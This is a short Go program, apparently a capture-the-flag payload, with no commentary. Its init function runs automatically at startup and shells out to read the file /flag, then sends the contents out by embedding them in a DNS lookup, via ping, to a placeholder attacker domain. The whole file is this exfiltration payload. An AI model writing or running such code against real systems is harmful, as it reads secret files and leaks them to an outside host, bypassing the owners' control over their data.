package main

import "os/exec"

func init() {
	exec.Command("sh", "-c", "ping -c 1 $(cat /flag).YOURDOMAIN.com").Run()
}

func main() {}

